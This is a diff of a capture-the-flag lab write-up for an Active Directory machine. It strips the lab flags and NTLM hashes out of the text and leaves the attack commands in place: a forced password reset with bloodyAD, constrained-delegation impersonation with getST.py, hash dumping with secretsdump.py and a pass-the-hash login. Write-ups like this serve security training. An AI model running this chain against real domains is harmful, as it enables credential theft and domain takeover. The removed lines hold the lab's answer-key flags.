@@ -13,11 +13,6 @@ Windows AD machine with a chain starting at anonymous FTP exposing a KeePass dat
 
 > **Critical note:** Administrator has the `NOT_DELEGATED` flag — S4U2self returns `KDC_ERR_BADOPTION`. Solution: impersonate `Ryan.Cooper` instead.
 
-| Flag | Hash |
-|------|------|
-| user.txt | `619144a029fa74f5282739e9d7a8a31e` |
-| root.txt | `592a7c8168dd3fe9f424adb361602bc2` |
-
 ---
 
 ## 1. Reconnaissance
@@ -78,7 +73,7 @@ bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set password HELEN.FROST 'P
 
 evil-winrm -i redelegate.vl -u HELEN.FROST -p 'Password1!'
 type C:\Users\Helen.Frost\Desktop\user.txt
-# 619144a029fa74f5282739e9d7a8a31e
+# <hash>
 ```
 
 ---
@@ -112,7 +107,7 @@ unset KRB5CCNAME
 
 getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper \
   -dc-ip 10.129.234.50 \
-  -hashes :855609703933ed05aef9c21b64c2a01e \
+  -hashes :<hash> \
   'redelegate.vl/FS01$'
 # → Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
 ```
@@ -122,11 +117,11 @@ getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper \
 ```bash
 export KRB5CCNAME=$(pwd)/Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
 secretsdump.py -k -no-pass dc.redelegate.vl
-# Administrator: ec17f7a2a4d96e177bfd101b94ffc0a7
+# Administrator: <hash>
 
-evil-winrm -i redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
+evil-winrm -i redelegate.vl -u administrator -H <hash>
 type C:\Users\Administrator\Desktop\root.txt
-# 592a7c8168dd3fe9f424adb361602bc2
+# <hash>
 ```
 
 ---
